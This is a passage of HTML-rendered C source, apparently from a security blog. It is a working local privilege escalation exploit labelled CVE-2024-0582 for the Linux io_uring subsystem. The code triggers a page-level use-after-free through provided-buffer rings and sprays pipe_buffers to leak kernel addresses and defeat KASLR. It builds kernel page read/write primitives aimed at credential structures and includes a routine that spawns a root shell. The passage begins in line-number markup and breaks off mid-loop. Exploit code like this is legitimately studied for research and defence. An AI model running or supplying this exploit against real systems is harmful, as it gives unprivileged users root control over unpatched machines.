class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2025 arttnba3 &lt;arttnba@gmail.com&gt;</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * This work is licensed under the terms of the GNU GPL, version 2 or later.</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;liburing.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> IS_ERR</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_ERR(ptr) ((uintptr_t) ptr &gt;= (uintptr_t) -4095UL)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PTR_ERR</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTR_ERR(ptr) ((int) (intptr_t) ptr)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUCCESS_MSG(msg) <span class="string">&quot;\033[32m\033[1m&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INFO_MSG(msg) <span class="string">&quot;\033[34m\033[1m&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERR_MSG(msg) <span class="string">&quot;\033[31m\033[1m&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KASLR_GRANULARITY 0x10000000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KASLR_MASK (~(KASLR_GRANULARITY - 1))</span></span><br><span class="line"><span class="type">uint64_t</span> kernel_base, vmemmap_base, page_offset_base;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(INFO_MSG(<span class="string">&quot;[*] Process binded to core: &quot;</span>) <span class="string">&quot;%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *fmt, ...)</span></span><br><span class="line">&#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    va_start(args, fmt);</span><br><span class="line">    <span class="built_in">printf</span>(fmt, args);</span><br><span class="line">    va_end(args);</span><br><span class="line"></span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    fflush(<span class="built_in">stderr</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root_shell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(ERR_MSG(<span class="string">&quot;[x] Failed to get the root!&quot;</span>));</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(SUCCESS_MSG(<span class="string">&quot;[+] Successful to get the root.&quot;</span>));</span><br><span class="line">    <span class="built_in">puts</span>(INFO_MSG(<span class="string">&quot;[*] Execve root shell now...&quot;</span>));</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* to exit the process normally, instead of potential segmentation fault */</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> io_uring_buf_ring*</span><br><span class="line"><span class="title function_">setup_pbuf_ring_mmap</span><span class="params">(<span class="keyword">struct</span> io_uring *ring, <span class="type">unsigned</span> <span class="type">int</span> ring_entries,</span></span><br><span class="line"><span class="params">                     <span class="type">int</span> bgid, <span class="type">unsigned</span> <span class="type">int</span> flags, <span class="type">int</span> *retp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_buf_ring</span> *<span class="title">buf_ring</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_buf_reg</span> <span class="title">buf_reg</span>;</span></span><br><span class="line">    <span class="type">size_t</span> ring_size;</span><br><span class="line">    <span class="type">off_t</span> offset;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;buf_reg, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf_reg));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* we don&#x27;t need to set reg.addr for IOU_PBUF_RING_MMAP */</span></span><br><span class="line">    buf_reg.ring_entries = ring_entries;</span><br><span class="line">    buf_reg.bgid = bgid;</span><br><span class="line">    buf_reg.flags = IOU_PBUF_RING_MMAP;</span><br><span class="line"></span><br><span class="line">    ret = io_uring_register_buf_ring(ring, &amp;buf_reg, flags);</span><br><span class="line">    <span class="keyword">if</span> (ret) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(ERR_MSG(<span class="string">&quot;[x] Error occur while doing io_uring_register_buf_ring&quot;</span>));</span><br><span class="line">        *retp = ret;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment"> [chr(int(i,16))for i in[&#x27;3361626e74747261&#x27;[i:i+2]for i in range(0,16,2)]][::-1]</span></span><br><span class="line"><span class="comment">    **/</span></span><br><span class="line">    offset = IORING_OFF_PBUF_RING | (<span class="type">uint64_t</span>) bgid &lt;&lt; IORING_OFF_PBUF_SHIFT;</span><br><span class="line">    ring_size = ring_entries * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_buf);</span><br><span class="line">    buf_ring = mmap(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        ring_size,</span><br><span class="line">        PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,</span><br><span class="line">        ring-&gt;ring_fd,</span><br><span class="line">        offset</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(buf_ring)) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(ERR_MSG(<span class="string">&quot;[x] Error occur while doing mmap() for io_uring&quot;</span>));</span><br><span class="line">        *retp = PTR_ERR(buf_ring);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *retp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> buf_ring;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * In my test environment, kmalloc-1k allocates from 4-page slub, so I chose 4.</span></span><br><span class="line"><span class="comment"> * However, it might not be the same in your environment, e.g., it&#x27;s 8 on my PC.</span></span><br><span class="line"><span class="comment"> * Check your /proc/slabinfo before doing the exploitation.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NR_PAGES    4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NR_BUFFERS  0x200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SEQ_FILE_NR 0x200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_SPRAY_NR 0x1F0</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">long</span> usage;</span><br><span class="line">    <span class="type">uint32_t</span> uid;</span><br><span class="line">    <span class="type">uint32_t</span> gid;</span><br><span class="line">    <span class="type">uint32_t</span> suid;</span><br><span class="line">    <span class="type">uint32_t</span> sgid;</span><br><span class="line">    <span class="type">uint32_t</span> euid;</span><br><span class="line">    <span class="type">uint32_t</span> egid;</span><br><span class="line">    <span class="type">uint32_t</span> fsuid;</span><br><span class="line">    <span class="type">uint32_t</span> fsgid;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">read_kernel_page_by_pipe</span><span class="params">(<span class="keyword">struct</span> page*page,<span class="keyword">struct</span> pipe_buffer*kern_pipe_buf,</span></span><br><span class="line"><span class="params">                              <span class="type">int</span> pipe_fd[<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    kern_pipe_buf-&gt;page = page;</span><br><span class="line">    kern_pipe_buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">    kern_pipe_buf-&gt;len = <span class="number">0xffe</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read(pipe_fd[<span class="number">0</span>], buf, len) != len) &#123;</span><br><span class="line">        perror(ERR_MSG(<span class="string">&quot;[x] Unable to do reading on pipe&quot;</span>));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_kernel_page_by_pipe</span><span class="params">(<span class="keyword">struct</span> page *page,</span></span><br><span class="line"><span class="params">                               <span class="keyword">struct</span> pipe_buffer*kern_pipe_buf,</span></span><br><span class="line"><span class="params">                               <span class="type">int</span> pipe_fd[<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    kern_pipe_buf-&gt;page = page;</span><br><span class="line">    kern_pipe_buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">    kern_pipe_buf-&gt;len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (write(pipe_fd[<span class="number">1</span>], buf, len) != len) &#123;</span><br><span class="line">        perror(ERR_MSG(<span class="string">&quot;[x] Unable to do writing on pipe&quot;</span>));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">exploit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring</span> <span class="title">ring</span>;</span></span><br><span class="line">    <span class="type">void</span> **buffers;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">kern_pipe_buffer</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">uint64_t</span> kernel_leak;</span><br><span class="line">    <span class="type">int</span> pipe_fd[PIPE_SPRAY_NR][<span class="number">2</span>], victim_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">uint32_t</span> uid, gid;</span><br><span class="line">    <span class="type">uint64_t</span> cred_kaddr, cred_kpage_addr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">cred_data</span>;</span></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(SUCCESS_MSG(<span class="string">&quot;-------- CVE-2024-0582 Exploitation --------&quot;</span>) <span class="string">&quot;\n&quot;</span></span><br><span class="line">    INFO_MSG(<span class="string">&quot;--------      Author: &quot;</span>)<span class="string">&quot;arttnba3&quot;</span>INFO_MSG(<span class="string">&quot;      --------&quot;</span>) <span class="string">&quot;\n&quot;</span></span><br><span class="line">    SUCCESS_MSG(<span class="string">&quot;-------- Local Privilege Escalation --------\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Initializing io_uring ...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (io_uring_queue_init(<span class="number">4</span>, &amp;ring, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(ERR_MSG(<span class="string">&quot;[x] Unable to init for io_uring queue&quot;</span>));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Allocating pbuf ring and doing mmap() ...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    buffers = <span class="built_in">calloc</span>(NR_BUFFERS, <span class="keyword">sizeof</span>(<span class="type">void</span>*));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NR_BUFFERS; i++) &#123;</span><br><span class="line">        buffers[i] = setup_pbuf_ring_mmap(</span><br><span class="line">            &amp;ring,</span><br><span class="line">            NR_PAGES * PAGE_SIZE / <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_buf),</span><br><span class="line">            i,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            &amp;ret</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (ret) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                ERR_MSG(<span class="string">&quot;[x] Unable to set up&quot;</span>) <span class="string">&quot; No.%d &quot;</span></span><br><span class="line">                ERR_MSG(<span class="string">&quot;pbuf ring, error code: &quot;</span>) <span class="string">&quot;%d\n&quot;</span>,</span><br><span class="line">                i,</span><br><span class="line">                ret</span><br><span class="line">            );</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        io_uring_buf_ring_init(buffers[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Triggering page-level UAF vulnerabilities ...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NR_BUFFERS; i += <span class="number">2</span>) &#123;   <span class="comment">/* we neeed &quot;holes&quot; */</span></span><br><span class="line">        ret = io_uring_unregister_buf_ring(&amp;ring, i);</span><br><span class="line">        <span class="keyword">if</span> (ret) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                ERR_MSG(<span class="string">&quot;[x] Unable to unregister&quot;</span>) <span class="string">&quot; No.%d &quot;</span></span><br><span class="line">                ERR_MSG(<span class="string">&quot;pbuf ring, error code: &quot;</span>) <span class="string">&quot;%d\n&quot;</span>,</span><br><span class="line">                i,</span><br><span class="line">                ret</span><br><span class="line">            );</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Reallocating pages as pipe_buffers ...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((ret = pipe(pipe_fd[i])) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                ERR_MSG(<span class="string">&quot;[x] Unable to set up&quot;</span>) <span class="string">&quot; No.%d &quot;</span></span><br><span class="line">                ERR_MSG(<span class="string">&quot;pipe, error code: &quot;</span>) <span class="string">&quot;%d\n&quot;</span>,</span><br><span class="line">                i,</span><br><span class="line">                ret</span><br><span class="line">            );</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Allocating pipe_buffer::page ...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Checking for UAF mmap address ...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NR_BUFFERS; i += <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="type">uint64_t</span> *buffer = buffers[i];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; (NR_PAGES * PAGE_SIZE / <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)); j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (buffer[j] &gt; <span class="number">0xffff000000000000</span></span><br><span class="line">                &amp;&amp; buffer[j + <span class="number">1</span>] == <span class="number">0x2000000000</span></span><br><span class="line">                &amp;&amp; buffer[j + <span class="number">2</span>] &gt; <span class="number">0xffffffff81000000</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(</span><br><span class="line">                    SUCCESS_MSG(<span class="string">&quot;[+] Got kernel pipe_buffer mapped at buffer:&quot;</span>)</span><br><span class="line">                    <span class="string">&quot; %d-%d\n&quot;</span>, i, j</span><br><span class="line">                );</span><br><span class="line">                <span class="built_in">printf</span>(</span><br><span class="line">                    INFO_MSG(<span class="string">&quot;[*] Leak pipe_buffer::page = &quot;</span>)<span class="string">&quot;%lx\n&quot;</span>, buffer[j]</span><br><span class="line">                );</span><br><span class="line">                <span class="built_in">printf</span>(</span><br><span class="line">                    INFO_MSG(<span class="string">&quot;[*] Leak pipe_buffer::ops = &quot;</span>)<span class="string">&quot;%lx\n&quot;</span>, buffer[j+<span class="number">2</span>]</span><br><span class="line">                );</span><br><span class="line">                kern_pipe_buffer = (<span class="type">void</span>*) &amp;buffer[j];</span><br><span class="line">                <span class="keyword">goto</span> out_find_pipe;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!kern_pipe_buffer) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(ERR_MSG(<span class="string">&quot;[x] Failed to find kernel pipe_buffer in user space!&quot;</span>));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">out_find_pipe:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Overwriting victim pipe_buffer::page ...&quot;</span>);</span><br><span class="line">    <span class="comment">/* note that the granularity of KASLR is 256MB, i.e. 0x10000000*/</span></span><br><span class="line">    vmemmap_base = (<span class="type">uint64_t</span>) kern_pipe_buffer-&gt;page &amp; KASLR_MASK;</span><br><span class="line">    kern_pipe_buffer-&gt;page = (<span class="type">void</span>*) (vmemmap_base + <span class="number">0x9d000</span> / <span class="number">0x1000</span> * <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;</span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;kernel_leak, <span class="keyword">sizeof</span>(kernel_leak));</span><br><span class="line">        <span class="keyword">if</span> (kernel_leak != *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(SUCCESS_MSG(<span class="string">&quot;[+] Got victim pipe at idx: &quot;</span>) <span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">            victim_idx = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim_idx == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(ERR_MSG(<span class="string">&quot;[x] Failed to find the victim pipe!&quot;</span>));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint64_t</span> loop_nr = <span class="number">0</span>; <span class="number">1</span>; loop_nr++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (kernel_leak &gt; <span class="number">0xffffffff81000000</span></span><br><span class="line">            &amp;&amp; (kernel_leak &amp; <span class="number">0xfff</span>) &lt; <span class="number">0x100</span>) &#123;</span><br><span class="line">            kernel_base = kernel_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">            <span class="keyword">if</span> (loop_nr != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                INFO_MSG(<span class="string">&quot;[*] Leak secondary_startup_64 : &quot;</span>) <span class="string">&quot;%lx\n&quot;</span>,kernel_leak</span><br><span class="line">            );</span><br><span class="line">            <span class="built_in">printf</span>(SUCCESS_MSG(<span class="string">&quot;[+] Got kernel base: &quot;</span>) <span class="string">&quot;%lx\n&quot;</span>, kernel_base);</span><br><span class="line">            <span class="built_in">printf</span>(SUCCESS_MSG(<span class="string">&quot;[+] Got vmemmap_base: &quot;</span>) <span class="string">&quot;%lx\n&quot;</span>, vmemmap_base);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">80</span>; i++) &#123;</span><br><span class="line">            <span class="built_in">putchar</span>(<span class="string">&#x27;\b&#x27;</span>);</span><br><span class="line">        